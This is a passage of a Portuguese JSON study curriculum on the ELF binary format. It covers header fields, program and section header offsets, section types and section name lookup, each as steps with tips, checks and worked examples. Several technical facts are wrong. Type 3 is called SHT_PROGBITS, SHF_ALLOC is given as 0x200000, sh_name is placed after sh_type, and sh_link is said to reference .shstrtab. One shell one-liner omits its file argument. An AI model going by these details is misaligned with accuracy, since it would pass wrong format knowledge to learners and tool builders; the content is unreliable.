                            "name": "Interpretar campos de tipo, máquina e versão (e_type, e_machine, e_version)",
                            "description": "Analisar os campos que especificam se é executável, compartilhado ou relocável, a arquitetura alvo (ex: x86_64) e a versão do formato ELF, validando compatibilidade com o sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as definições e valores possíveis dos campos e_type, e_machine e e_version",
                                  "subSteps": [
                                    "Leia a especificação oficial do ELF (seções sobre o cabeçalho principal).",
                                    "Memorize os valores enum para e_type: ET_NONE (0), ET_REL (1), ET_EXEC (2), ET_DYN (3), ET_CORE (4).",
                                    "Estude os valores para e_machine: EM_386 (3), EM_X86_64 (62), EM_ARM (40), etc., focando em arquiteturas comuns.",
                                    "Aprenda que e_version tipicamente é EV_CURRENT (1) e indica a versão do formato ELF.",
                                    "Anote diferenças entre executável estático/dinâmico, relocável e core dump."
                                  ],
                                  "verification": "Liste corretamente pelo menos 4 valores possíveis para cada campo com suas descrições em um documento de notas.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Especificação ELF (PDF ou man page)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use tabelas para organizar enums; foque em x86_64 como exemplo principal.",
                                  "learningObjective": "Identificar o propósito e valores válidos de cada campo no contexto do formato ELF.",
                                  "commonMistakes": [
                                    "Confundir e_type com e_machine",
                                    "Ignorar que e_version raramente varia",
                                    "Não diferenciar ET_DYN de ET_EXEC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e extrair os campos do cabeçalho ELF usando ferramentas",
                                  "subSteps": [
                                    "Instale ou acesse a ferramenta readelf (parte do binutils).",
                                    "Execute 'readelf -h <arquivo_binario>' em um executável ELF simples como /bin/ls.",
                                    "Identifique as posições dos campos: e_type (bytes 16-17), e_machine (18-19), e_version (20-23).",
                                    "Extraia valores em hexadecimal e decimal usando hexdump ou readelf.",
                                    "Compare saída de readelf com hexdump -C para validação manual."
                                  ],
                                  "verification": "Capture screenshot ou anote saída de readelf mostrando os três campos corretamente localizados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Ferramenta readelf",
                                    "Binários ELF de teste (ex: /bin/ls, hello world compilado)",
                                    "hexdump"
                                  ],
                                  "tips": "Sempre use little-endian em mente para x86; teste em diferentes binários.",
                                  "learningObjective": "Extrair com precisão os valores dos campos do cabeçalho ELF de um binário real.",
                                  "commonMistakes": [
                                    "Ler bytes errados no hexdump",
                                    "Confundir endianness",
                                    "Usar arquivo não-ELF"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar valores extraídos e determinar o tipo de arquivo",
                                  "subSteps": [
                                    "Mapeie o valor de e_type para seu significado (ex: 2 = ET_EXEC = executável).",
                                    "Verifique e_machine contra arquitetura do sistema (ex: uname -m para x86_64).",
                                    "Confirme e_version == 1; investigue se diferente.",
                                    "Classifique o binário: 'executável x86_64 dinâmico' baseado nos valores.",
                                    "Teste execução ou ld.so para validar interpretação."
                                  ],
                                  "verification": "Escreva um relatório curto descrevendo o tipo, máquina e versão de 2 binários diferentes.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Binários variados (estático, dinâmico, ARM se possível)",
                                    "Comando uname"
                                  ],
                                  "tips": "Crie um script simples para automatizar mapeamento de valores.",
                                  "learningObjective": "Traduzir valores hex/dec para descrições funcionais precisas.",
                                  "commonMistakes": [
                                    "Interpretar ET_DYN como não-executável",
                                    "Ignorar mismatches de arquitetura",
                                    "Assumir e_version sempre 1 sem checar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar compatibilidade e simular cenários de incompatibilidade",
                                  "subSteps": [
                                    "Compare e_machine com arquitetura host (ex: file comando ou uname).",
                                    "Teste execução: ./binário; analise erros como 'Exec format error'.",
                                    "Simule cross-compilação: compile para ARM em x86 e verifique campos.",
                                    "Use objdump ou readelf para checar se relocável vs. executável afeta carregamento.",
                                    "Documente riscos de segurança (ex: executar binário incompatível)."
                                  ],
                                  "verification": "Demonstre um caso de incompatibilidade resolvido ou explicado em log.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Compilador cross (ex: arm-linux-gnueabi-gcc)",
                                    "QEMU para emulação opcional"
                                  ],
                                  "tips": "Use 'file <binário>' como verificação rápida inicial.",
                                  "learningObjective": "Avaliar se um binário ELF é compatível com o sistema alvo.",
                                  "commonMistakes": [
                                    "Executar binário ARM em x86 sem emulador",
                                    "Ignorar ASLR/PIE em ET_DYN",
                                    "Não testar static vs dynamic"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando readelf -h /bin/ls: e_type=0x2 (ET_EXEC: executável), e_machine=0x3e (EM_X86_64), e_version=0x1 (EV_CURRENT). Isso indica um executável dinâmico para x86_64 Linux, compatível com sistemas AMD64 modernos. Teste: ./ls funciona; altere manualmente e_machine para 0x28 (ARM) e veja 'Exec format error'.",
                              "finalVerifications": [
                                "Corretamente lista valores e interpretações para e_type de um binário dado.",
                                "Identifica arquitetura correta via e_machine e compara com host.",
                                "Confirma e_version e discute implicações se !=1.",
                                "Valida compatibilidade executando ou simulando falha.",
                                "Explica diferenças entre ET_EXEC e ET_DYN em contexto prático.",
                                "Documenta extração manual via hexdump para pelo menos um campo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de valores e enums (100% correto).",
                                "Profundidade na interpretação e validação de compatibilidade.",
                                "Uso correto de ferramentas (readelf, hexdump) sem erros.",
                                "Cobertura de cenários edge (incompatível, relocável).",
                                "Clareza no relatório com exemplos concretos.",
                                "Identificação de erros comuns e prevenção."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender ISAs via e_machine.",
                                "Sistemas Operacionais: Loaders ELF e verificação de compatibilidade.",
                                "Segurança Computacional: Detecção de binários maliciosos incompatíveis.",
                                "Programação em C/Assembly: Compilação cross e formatos executáveis.",
                                "Análise de Malware: Reverse engineering inicial de ELF headers."
                              ],
                              "realWorldApplication": "Em análise forense digital ou reverse engineering de malware, interpretar esses campos permite triagem rápida de binários suspeitos, detectando tentativas de execução cross-arquitetura (ex: Windows PE em Linux ELF) ou versões obsoletas, prevenindo infecções em sandboxes ou sistemas de produção."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.3",
                            "name": "Localizar offsets para tabelas de seções e segmentos (e_shoff, e_phoff)",
                            "description": "Ler os offsets e tamanhos das tabelas de cabeçalhos de programa e seções, permitindo navegação para as estruturas subsequentes no arquivo binário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar a estrutura do ELF Header e identificar campos e_shoff e e_phoff",
                                  "subSteps": [
                                    "Consulte a documentação oficial do ELF (ex: man elf ou especificação gABI)",
                                    "Identifique o offset fixo: e_shoff está no byte 40 (0x28) para ELF 64-bit, 8 bytes",
                                    "Identifique e_phoff no byte 32 (0x20), também 8 bytes",
                                    "Note que ELF pode ser 32-bit ou 64-bit; verifique e_ident[EI_CLASS] no início",
                                    "Entenda que offsets são em little-endian na maioria dos sistemas x86"
                                  ],
                                  "verification": "Desenhe ou anote um diagrama do ELF Header destacando posições de e_shoff e e_phoff",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Documentação ELF (PDF gABI), editor de texto para anotações",
                                  "tips": "Use um hex editor visual como hexedit para mapear offsets manualmente",
                                  "learningObjective": "Compreender as posições exatas e o formato dos campos de offset no ELF Header",
                                  "commonMistakes": "Confundir ELF 32-bit (offsets de 4 bytes) com 64-bit (8 bytes); ignorar endianness"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Abrir um arquivo ELF binário e extrair bytes dos offsets e_shoff e e_phoff",
                                  "subSteps": [
                                    "Baixe ou compile um binário ELF simples (ex: 'ls' no Linux)",
                                    "Use hexdump -C ou xxd para visualizar o header em hex",
                                    "Navegue para offset 0x20 (e_phoff) e 0x28 (e_shoff) e copie os 8 bytes",
                                    "Confirme o tipo de ELF lendo e_ident[0] == 0x7F 'ELF'",
                                    "Anote os valores hexadecimais extraídos"
                                  ],
                                  "verification": "Extraia e liste os bytes exatos de e_phoff e e_shoff de um binário real",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Binário ELF (ex: /bin/ls), ferramentas: hexdump, xxd, hex editor (Bless ou ImHex)",
                                  "tips": "Comece com ELF 64-bit estático para simplicidade; use 'file' para confirmar formato",
                                  "learningObjective": "Localizar e ler manualmente os bytes dos offsets no header de um arquivo real",
                                  "commonMistakes": "Ler offsets errados devido a contagem de bytes off-by-one; não verificar magic number ELF"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar os bytes como offsets numéricos e validar endianness",
                                  "subSteps": [
                                    "Converta os 8 bytes little-endian para decimal usando calculadora hex ou Python (int.from_bytes(..., 'little'))",
                                    "Para e_phoff: calcule o endereço da tabela de programa headers",
                                    "Para e_shoff: calcule o endereço da tabela de seção headers",
                                    "Compare com saída de 'readelf -h arquivo' para validar",
                                    "Note se o binário é big-endian (raro em x86, comum em PowerPC)"
                                  ],
                                  "verification": "Os valores calculados manualmente coincidem com readelf -h (campos e_phoff e e_shoff)",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Python interpreter, readelf tool, calculadora hex online",
                                  "tips": "Escreva um snippet Python simples: with open('file', 'rb') as f: f.seek(32); print(int.from_bytes(f.read(8), 'little'))",
                                  "learningObjective": "Converter bytes raw em offsets utilizáveis, considerando endianness",
                                  "commonMistakes": "Usar wrong endianness (big ao invés de little); overflow em cálculos manuais"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Navegar para as tabelas usando os offsets e verificar estruturas",
                                  "subSteps": [
                                    "Use o offset e_phoff para pular e ler o primeiro Program Header (tipicamente PT_LOAD)",
                                    "Use e_shoff para acessar Section Header Table e ler nomes/tipos",
                                    "Compare com readelf -l (program headers) e readelf -S (section headers)",
                                    "Identifique e_phnum e e_shnum para saber quantos headers há",
                                    "Teste em múltiplos binários (dinâmico vs estático)"
                                  ],
                                  "verification": "Acesse corretamente as tabelas e liste 2-3 headers de cada tipo",
                                  "estimatedTime": "30 minutos",
                                  "materials": "readelf, objdump, múltiplos binários ELF",
                                  "tips": "Automatize com script Python para seek e parse; pratique com binários stripped",
                                  "learningObjective": "Usar offsets para navegar e validar o conteúdo das tabelas de headers",
                                  "commonMistakes": "Não ajustar para tamanho do header (ex: e_phentsize); assumir ordem fixa de headers"
                                }
                              ],
                              "practicalExample": "Usando /bin/ls (ELF 64-bit): hexdump mostra e_phoff=0x240 (bytes 20-27: 40 02 00 00 00 00 00 00), e_shoff=0x1e0. Navegue para 0x240 e veja PT_INTERP, etc. Valide com readelf -h /bin/ls.",
                              "finalVerifications": [
                                "Calcula corretamente e_shoff e e_phoff de um binário dado os bytes raw",
                                "Navega para as tabelas e identifica pelo menos um Program Header e um Section Header",
                                "Valida resultados comparando com readelf/objdump",
                                "Diferencia ELF 32/64-bit e ajusta tamanhos de offset",
                                "Detecta e corrige endianness em binários não-x86",
                                "Aplica em binário stripped sem símbolos"
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de bytes (100% match com tools)",
                                "Correta conversão endian-aware (erro <1%)",
                                "Navegação bem-sucedida para tabelas (lista headers corretos)",
                                "Explicação clara de discrepâncias em binários variados",
                                "Tempo de execução eficiente (<90 min total)",
                                "Uso de múltiplas verificações independentes"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Uso de fread/fseek para parse binário",
                                "Análise de Sistemas Operacionais: Loaders e mmap em ELF",
                                "Criptografia: Verificação de integridade em seções .text",
                                "Redes: Análise de binários em forensics de malware",
                                "Matemática: Conversão binária/hexadecimal e aritmética de ponteiros"
                              ],
                              "realWorldApplication": "Em análise de malware, engenharia reversa e debugging, esses offsets permitem mapear seções executáveis (.text), bibliotecas dinâmicas e dados, essencial para desofuscação de payloads ou patching de vulnerabilidades em binários ELF no Linux."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.2",
                        "name": "Seções no Formato ELF (Sections)",
                        "description": "Unidades lógicas de dados no arquivo ELF, como código, dados e símbolos, organizadas em uma tabela de cabeçalhos de seções acessível para linking e depuração.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.2.1",
                            "name": "Entender a estrutura da Tabela de Cabeçalhos de Seções (Section Header Table)",
                            "description": "Descrever o layout da tabela no final do arquivo, com entradas fixas de 40 ou 64 bytes cada (dependendo da classe ELF), incluindo campos como sh_name, sh_type e sh_offset.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar a Tabela de Cabeçalhos de Seções no ELF",
                                  "subSteps": [
                                    "Leia a seção de cabeçalho principal (e_ident, e_shoff, e_shentsize, e_shnum, e_shstrndx).",
                                    "Calcule o offset da tabela: e_shoff aponta para o início da Section Header Table.",
                                    "Verifique o tamanho de cada entrada: 40 bytes para ELF32, 64 bytes para ELF64 (e_shentsize).",
                                    "Confirme o número de entradas: e_shnum indica quantas seções existem.",
                                    "Identifique a string table para nomes: e_shstrndx referencia a seção de strings."
                                  ],
                                  "verification": "Use `readelf -h` para confirmar e_shoff, e_shentsize, e_shnum e e_shstrndx.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta readelf, documento ELF specification (toolchain docs), um binário ELF simples (ex: hello world compilado com gcc -m32).",
                                  "tips": "Sempre verifique e_ident[EI_CLASS] primeiro para distinguir ELF32 vs ELF64.",
                                  "learningObjective": "Compreender onde e como a tabela é posicionada no arquivo ELF.",
                                  "commonMistakes": "Confundir e_shoff com offset de seções de dados; ignorar endianness little-endian."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar e Descrever os Campos da Estrutura de Cabeçalho",
                                  "subSteps": [
                                    "Liste os campos ELF32: sh_name (4B), sh_type (4B), sh_flags (4B), sh_addr (4B), sh_offset (4B), sh_size (4B), sh_link (4B), sh_info (4B), sh_addralign (4B), sh_entsize (4B).",
                                    "Para ELF64: sh_name (4B), sh_type (4B), sh_flags (8B), sh_addr (8B), sh_offset (8B), sh_size (8B), sh_link (4B), sh_info (4B), sh_addralign (8B), sh_entsize (8B).",
                                    "Explique funções: sh_name (índice na string table), sh_type (SHT_PROGBITS, SHT_SYMTAB etc.), sh_offset (posição no arquivo).",
                                    "Anote tipos comuns: SHT_NULL (0), SHT_PROGBITS (1), SHT_SYMTAB (2).",
                                    "Desenhe um diagrama da estrutura com tamanhos cumulativos."
                                  ],
                                  "verification": "Escreva uma tabela manual listando todos os 10 campos com tamanhos e offsets relativos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "ELF spec PDF (System V ABI), editor de texto ou papel para diagrama, hex editor (xxd ou bless).",
                                  "tips": "Use mnemônicos: 'Name, Type, Flags, Addr, Offset, Size, Link, Info, Align, EntSize'.",
                                  "learningObjective": "Dominar a composição exata de cada entrada de 40/64 bytes.",
                                  "commonMistakes": "Errar tamanhos em ELF64 (ex: sh_flags é 8B); confundir sh_offset (arquivo) com sh_addr (memória)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar a Tabela Usando Ferramentas e Hex Dump",
                                  "subSteps": [
                                    "Execute `readelf -S arquivo.elf` para dump da tabela completa.",
                                    "Use `xxd -s $(readelf -h arquivo.elf | grep 'Start of section headers' | cut -d: -f2 | xargs) -l $(($(readelf -h | grep 'Size of section headers' | cut -d: -f2 | xargs)/1)) arquivo.elf` para hex dump.",
                                    "Parse manualmente a primeira entrada: extraia sh_name, sh_type etc. byte a byte.",
                                    "Correlacione com `readelf -S`: nome da seção via string table em offset sh_name.",
                                    "Identifique seções chave: .text (sh_type=1, sh_flags=executable), .data."
                                  ],
                                  "verification": "Reproduza manualmente 3 entradas da tabela e compare com readelf output.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Binário ELF32 e ELF64, readelf/objdump, xxd/hexdump, calculadora para offsets.",
                                  "tips": "Comece com ELF32 (mais simples); use `objdump -h` para visão alternativa.",
                                  "learningObjective": "Aplicar conhecimento para decodificar a tabela em um arquivo real.",
                                  "commonMistakes": "Ignorar string table (sh_name é índice, não string); offsets errados em big-endian."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Navegar Entre Tabela e Conteúdo das Seções",
                                  "subSteps": [
                                    "Para cada entrada, vá para sh_offset e confirme sh_size bytes correspondem à seção.",
                                    "Use sh_link/sh_info: ex: sh_link aponta para string table associada.",
                                    "Verifique alinhamentos: conteúdo em sh_offset deve respeitar sh_addralign.",
                                    "Compare com seções conhecidas: dump .text com `objdump -d` e localize via tabela.",
                                    "Teste remoção de seções NULL (sh_type=0) para entender estrutura dinâmica."
                                  ],
                                  "verification": "Crie um script Python/hexdump que liste seções com offsets e tamanhos corretos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Python com struct module, binário ELF com múltiplas seções (gcc -g hello.c).",
                                  "tips": "Escreva um parser simples em Python para praticar: struct.unpack('10I', data).",
                                  "learningObjective": "Conectar metadados da tabela ao conteúdo real das seções.",
                                  "commonMistakes": "Acessar sh_offset sem verificar se é carregável (sh_addr=0 para não-carregáveis)."
                                }
                              ],
                              "practicalExample": "Em um ELF32 'hello', e_shoff=0x238, e_shentsize=40, e_shnum=28. Primeira entrada (offset 0x238): sh_name=0 (NULL), sh_type=0, sh_flags=0,... . Segunda: sh_name=1 (\".interp\"), sh_type=3 (SHT_PROGBITS), sh_offset=0x88, sh_size=16. Use xxd -s 0x238 para ver bytes 00 00 00 00 00 00 00 00 ... confirmando NULL.",
                              "finalVerifications": [
                                "Liste todos 10 campos com tamanhos para ELF32/64 sem consultar docs.",
                                "Parse manual uma Section Header de um ELF real via hex editor.",
                                "Explique diferença entre sh_offset e sh_addr em 3 exemplos.",
                                "Identifique seções .text, .data, .bss em readelf -S output.",
                                "Calcule offset da última seção dado e_shoff, e_shnum, e_shentsize.",
                                "Diferencie SHT_NULL de seções reais e seu propósito."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de tamanhos/tipos de campos (100% correto).",
                                "Capacidade de localizar e dump tabela sem erros de offset.",
                                "Correta interpretação de pelo menos 5 entradas reais.",
                                "Explicação clara de sh_link/sh_info em contexto.",
                                "Diagrama visual da estrutura com offsets cumulativos.",
                                "Identificação correta de ELF32 vs ELF64 pela tabela."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender linker scripts e ld --verbose para gerar ELF.",
                                "Sistemas Operacionais: Mapeamento de seções para memória virtual (mmap).",
                                "Segurança: Análise de binários para ROP gadgets em .text.",
                                "Redes: Dissecção de protocolos binários semelhantes (ex: TCP headers).",
                                "Matemática: Cálculos de offsets e alinhamentos binários."
                              ],
                              "realWorldApplication": "Em análise de malware, engenharia reversa (Ghidra/IDA Pro usa Section Headers para navegação); debugging de crashes (core dumps ELF); otimização de binários (strip/reduce seções desnecessárias); auditoria de segurança (verificar seções ocultas ou malformed)."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.2",
                            "name": "Identificar tipos comuns de seções (.text, .data, .bss, .symtab)",
                            "description": "Classificar seções por tipo (SHT_PROGBITS, SHT_NOBITS, SHT_SYMTAB), flags (alocável, executável) e atributos, usando readelf -S para listar e analisar.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos teóricos das seções comuns no ELF",
                                  "subSteps": [
                                    "Estude as seções .text (código executável, SHT_PROGBITS, flags: ALLOC, EXECINSTR)",
                                    "Aprenda sobre .data (dados inicializados, SHT_PROGBITS, flags: ALLOC, WRITE)",
                                    "Entenda .bss (dados não inicializados, SHT_NOBITS, flags: ALLOC, WRITE)",
                                    "Analise .symtab (tabela de símbolos, SHT_SYMTAB, flags: nenhuma alocação típica)",
                                    "Revise atributos gerais: tipo (SHT_*), flags (SHF_ALLOC, SHF_EXECINSTR, SHF_WRITE)"
                                  ],
                                  "verification": "Liste verbalmente ou por escrito as 4 seções com tipo e flags principais sem consultar notas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação ELF (man 8 elf), PDF do formato ELF (ex: elf.pdf de toolchain docs)",
                                  "tips": "Use mnemônicos: .text=texto executável, .data=dados definidos, .bss=blank space, .symtab=símbolos.",
                                  "learningObjective": "Memorizar e diferenciar tipos e flags das seções comuns ELF.",
                                  "commonMistakes": "Confundir .data e .bss (um inicializado, outro não); ignorar flags como SHF_WRITE."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente e explorar ferramenta readelf",
                                  "subSteps": [
                                    "Instale binutils em Linux (sudo apt install binutils)",
                                    "Compile um binário simples: echo 'int main(){}' | gcc -o hello.elf -",
                                    "Execute 'readelf -h hello.elf' para overview do cabeçalho ELF",
                                    "Execute 'readelf -S hello.elf' e identifique colunas: [Nr], Name, Type, Address, Off, Size, ES, Flg, Lk, Inf, Al",
                                    "Pratique flags: interprete 'AX' como ALLOC+EXECINSTR"
                                  ],
                                  "verification": "Gere saída de readelf -S em um binário e explique 3 colunas principais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Linux terminal, gcc compiler, binário ELF de exemplo (/bin/ls ou self-compiled)",
                                  "tips": "Use 'readelf --help' para opções; foque em -S para seções.",
                                  "learningObjective": "Dominar instalação e uso básico de readelf para inspecionar seções.",
                                  "commonMistakes": "Executar readelf em binários não-ELF (use file comando primeiro); ignorar saída verbose."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar seções em binário real com readelf -S",
                                  "subSteps": [
                                    "Execute 'readelf -S /bin/ls' e localize .text, .data, .bss, .symtab",
                                    "Classifique cada: .text (SHT_PROGBITS, AX), .data (SHT_PROGBITS, AW), .bss (SHT_NOBITS, AW), .symtab (SHT_SYMTAB)",
                                    "Note tamanhos, endereços e alinhamentos (Al)",
                                    "Compare com 'readelf -s /bin/ls' para símbolos em .symtab",
                                    "Anote flags hex: 0x2=ALLOC, 0x4=EXECINSTR, 0x1=WRITE"
                                  ],
                                  "verification": "Produza tabela manual resumindo 4 seções com tipo, flags e propósito de /bin/ls.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Terminal Linux, binários sistema (/bin/ls, /usr/bin/gcc)",
                                  "tips": "Pipe para less: readelf -S /bin/ls | less; procure nomes com grep '.text' etc.",
                                  "learningObjective": "Interpretar saída readelf -S e mapear para classificações.",
                                  "commonMistakes": "Confundir Type (SHT_*) com Flags (Flg); assumir todas seções são alocáveis."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar classificação e análise avançada de atributos",
                                  "subSteps": [
                                    "Compile binários variados: estático (gcc -static), com dados grandes (int arr[1000];)",
                                    "Use readelf -S em cada e classifique seções alteradas (.bss maior)",
                                    "Analise links (Lk): .symtab linka para .strtab",
                                    "Verifique com objdump -h para confirmação cruzada",
                                    "Documente padrões: seções PROGBITS têm conteúdo, NOBITS não"
                                  ],
                                  "verification": "Classifique corretamente seções em 2 binários diferentes sem readelf visível.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "gcc, objdump, múltiplos binários compilados",
                                  "tips": "Varie inputs para ver mudanças: -g para debug sections extras.",
                                  "learningObjective": "Aplicar conhecimento em cenários variados e entender atributos dinâmicos.",
                                  "commonMistakes": "Ignorar seções dinâmicas (.dynsym); confundir .symtab com .dynsym."
                                }
                              ],
                              "practicalExample": "Compile 'gcc -o vuln.elf vuln.c' onde vuln.c tem int global=42; int bss; main(){}. Execute readelf -S vuln.elf, identifique .text (SHT_PROGBITS AX), .data (AW com global), .bss (AW vazio), .symtab (lista símbolos como main).",
                              "finalVerifications": [
                                "Lista corretamente .text como SHT_PROGBITS com flags ALLOC+EXECINSTR.",
                                "Diferencia .data (PROGBITS, WRITE) de .bss (NOBITS, WRITE).",
                                "Identifica .symtab como SHT_SYMTAB sem flags alocação.",
                                "Interpreta saída readelf -S de binário sistema sem erros.",
                                "Explica propósito de cada seção em contexto de execução.",
                                "Reconhece flags hexadecimais (ex: 0x200000 = SHF_ALLOC)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação de tipos SHT_* (90%+ correto).",
                                "Compreensão de flags e atributos (ex: executável só em .text).",
                                "Habilidade em interpretar readelf -S raw output.",
                                "Aplicação a binários variados sem prompts.",
                                "Identificação de erros comuns em análise (ex: .bss não tem disco).",
                                "Documentação clara de análises"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entendimento de linkagem e seções geradas pelo linker.",
                                "Sistemas Operacionais: mapeamento de seções para memória virtual (text+data em .text/.data).",
                                "Segurança Computacional: análise para ROP em .text, leaks em .data.",
                                "Engenharia Reversa: base para disassemblers como IDA/Ghidra."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar seções .text para hooks maliciosos, .data para strings C2, .bss para heaps exploráveis; em debugging de binários, usar para depuração sem-fonte; em hardening, verificar ASLR reloc em flags."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.2.3",
                            "name": "Acessar strings e nomes de seções via sh_link e sh_name",
                            "description": "Navegar pela seção de nomes (.shstrtab) usando índices para ler nomes de seções e relacionamentos entre headers, facilitando mapeamento de conteúdo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura da tabela de strings .shstrtab e o campo sh_link",
                                  "subSteps": [
                                    "Estude a documentação ELF sobre Elf64_Shdr, focando em sh_name (offset de 32 bits na .shstrtab) e sh_link (índice da seção de strings).",
                                    "Identifique que sh_link geralmente aponta para o índice da .shstrtab em headers de seção.",
                                    "Abra um arquivo ELF com readelf -S e observe os valores de sh_link e sh_name nas seções.",
                                    "Confirme que a seção com sh_type = SHT_STRTAB e nome '.shstrtab' é referenciada por sh_link.",
                                    "Anote exemplos de sh_link == índice da .shstrtab em várias seções."
                                  ],
                                  "verification": "Listar corretamente o índice da .shstrtab via sh_link de pelo menos 3 seções diferentes usando readelf.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta readelf, amostra de binário ELF (ex: /bin/ls), documentação ELF man pages.",
                                  "tips": "Use readelf -h e readelf -S juntos para correlacionar e_shoff com seções.",
                                  "learningObjective": "Entender como sh_link referencia a tabela de strings compartilhada.",
                                  "commonMistakes": "Confundir sh_link com sh_info ou assumir que todas as seções usam a mesma string table."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar offsets sh_name nos headers de seção",
                                  "subSteps": [
                                    "Extraia o array de Elf64_Shdr usando uma ferramenta como hexdump ou Python com struct.",
                                    "Para cada seção, leia o campo sh_name (offset 4 bytes após sh_type).",
                                    "Converta o offset sh_name para decimal e anote-o ao lado do nome esperado da seção.",
                                    "Valide offsets cruzando com readelf -S output.",
                                    "Identifique offsets zero ou inválidos em seções sem nome."
                                  ],
                                  "verification": "Criar uma tabela manual mapeando índice da seção → sh_name offset → nome esperado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Editor hexadecimal (ex: xxd, bless), readelf, Python com biblioteca elftools.",
                                  "tips": "Offsets sh_name são relativos ao início da .shstrtab, terminados por NUL.",
                                  "learningObjective": "Mapear offsets de nomes de seções para localização precisa na string table.",
                                  "commonMistakes": "Ler sh_name como string direta em vez de offset; ignorar endianness em dumps hex."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Acessar e extrair strings da .shstrtab usando offsets sh_name",
                                  "subSteps": [
                                    "Localize o offset da .shstrtab no array de seções via seu próprio sh_offset.",
                                    "Para um sh_name offset X, posicione no arquivo: sh_offset_da_shstrtab + X.",
                                    "Leia bytes sequenciais até NUL (\\x00) para obter o nome da seção.",
                                    "Automatize com script Python: struct.unpack e fseek para ler strings.",
                                    "Compare extraídos com readelf --section-headers para validação."
                                  ],
                                  "verification": "Extrair e listar nomes de 5 seções usando offsets manualmente ou via script.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Python3 com pyelftools ou struct, amostra ELF, hexdump -C.",
                                  "tips": "Strings são null-terminated; use len() até \\x00 em scripts.",
                                  "learningObjective": "Ler strings de forma programática ou manual da tabela compartilhada.",
                                  "commonMistakes": "Não somar offset da seção à sh_name; overflow em offsets grandes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Navegar relacionamentos entre seções via sh_link e mapear conteúdo",
                                  "subSteps": [
                                    "Use sh_link de uma seção para acessar outra (ex: .symtab sh_link → .strtab).",
                                    "Crie um grafo simples: seção A (sh_link=B) → nomes via sh_name de A e B.",
                                    "Rastreie chains: siga múltiplos sh_link para dependências.",
                                    "Mapeie conteúdo: para .rela.text, sh_link=.text, sh_info=índice texto.",
                                    "Gere relatório de mapeamento completo de nomes e links."
                                  ],
                                  "verification": "Produzir diagrama ou tabela de 10+ relacionamentos sh_link/sh_name corretos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Graphviz ou draw.io para diagrama, readelf -W -a, script Python para automação.",
                                  "tips": "sh_link=0 significa sem link; foque em seções nomeadas.",
                                  "learningObjective": "Utilizar sh_link/sh_name para navegação e mapeamento de estruturas ELF.",
                                  "commonMistakes": "Assumir sh_link sempre aponta para .shstrtab (só para nomes); loops infinitos em chains."
                                }
                              ],
